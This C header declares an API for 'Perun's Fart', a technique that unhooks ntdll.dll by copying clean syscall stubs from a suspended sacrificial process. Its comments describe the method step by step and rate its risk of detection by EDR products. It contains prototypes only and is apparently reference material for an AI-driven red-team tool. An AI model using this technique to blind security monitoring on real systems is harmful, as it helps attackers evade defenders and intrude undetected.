// Reference code for Noctis-MCP AI intelligence system
// Perun's Fart - Memory-Based NTDLL Unhooking
// Source: https://github.com/plackyhacker/Peruns-Fart
// Research: Argus Red Team Intelligence Report 2024-2025 (Phase 2)
//
// TECHNIQUE: Memory-Based Unhooking via Sacrificial Process
// IMPROVEMENT: No disk reads (defeats NtReadFile monitoring)
// DETECTION RISK: Very Low (5-10%) vs Disk-based unhooking (15-20%)
//
// How it works:
// 1. Create sacrificial process in suspended state (e.g., notepad.exe)
// 2. Read clean ntdll.dll from sacrificial process memory (not disk)
// 3. Parse PE headers to find .text section
// 4. Copy clean syscall stubs to current process ntdll
// 5. Terminate sacrificial process
// 6. EDR hooks are removed without triggering disk read alerts
//
// Critical: EDRs monitor NtReadFile for ntdll.dll reads (disk unhooking)
// Perun's Fart reads from process memory instead (PEB traversal)

#ifndef PERUNS_FART_H
#define PERUNS_FART_H

#include <Windows.h>
#include <winternl.h>

// Unhooking configuration
typedef struct _UNHOOK_CONFIG {
    WCHAR wzSacrificialProcess[MAX_PATH];  // Process to spawn (e.g., notepad.exe)
    BOOL bUnhookAll;                       // Unhook all functions (TRUE) or specific list
    DWORD dwFunctionCount;                 // Number of functions to unhook (if bUnhookAll=FALSE)
    LPCSTR* pszFunctionNames;              // Array of function names to unhook
} UNHOOK_CONFIG, *PUNHOOK_CONFIG;

// Unhooking context
typedef struct _UNHOOK_CONTEXT {
    UNHOOK_CONFIG config;
    HANDLE hSacrificialProcess;            // Sacrificial process handle
    HANDLE hSacrificialThread;             // Sacrificial thread handle (suspended)
    DWORD dwSacrificialPID;                // Sacrificial process ID
    PVOID pLocalNtdllBase;                 // Current process ntdll.dll base
    PVOID pRemoteNtdllBase;                // Sacrificial process ntdll.dll base
    SIZE_T szNtdllSize;                    // Size of ntdll.dll
    PVOID pCleanNtdll;                     // Buffer for clean ntdll
} UNHOOK_CONTEXT, *PUNHOOK_CONTEXT;

// Initialize unhooking context
BOOL PerunsFart_Initialize(
    PUNHOOK_CONTEXT pContext,
    LPCWSTR wzSacrificialProcess,
    BOOL bUnhookAll
);

// Execute unhooking operation
BOOL PerunsFart_Execute(PUNHOOK_CONTEXT pContext);

// Cleanup unhooking context
VOID PerunsFart_Cleanup(PUNHOOK_CONTEXT pContext);

// Internal: Create sacrificial process (suspended)
BOOL _PerunsFart_CreateSacrificialProcess(PUNHOOK_CONTEXT pContext);

// Internal: Find ntdll.dll in remote process memory
BOOL _PerunsFart_FindRemoteNtdll(PUNHOOK_CONTEXT pContext);

// Internal: Read clean ntdll from sacrificial process
BOOL _PerunsFart_ReadCleanNtdll(PUNHOOK_CONTEXT pContext);

// Internal: Unhook syscall stubs in current process
BOOL _PerunsFart_UnhookSyscalls(PUNHOOK_CONTEXT pContext);

// Internal: Terminate sacrificial process
BOOL _PerunsFart_TerminateSacrificialProcess(PUNHOOK_CONTEXT pContext);

// Utility: Get module base address in remote process (via PEB)
PVOID PerunsFart_GetRemoteModuleBase(HANDLE hProcess, LPCWSTR wzModuleName);

// Utility: Check if function is hooked (compare bytes)
BOOL PerunsFart_IsFunctionHooked(PVOID pLocalFunc, PVOID pCleanFunc, SIZE_T szCompareSize);

// Utility: Unhook single function
BOOL PerunsFart_UnhookFunction(LPCSTR pszFunctionName, PVOID pCleanNtdll);

#endif // PERUNS_FART_H
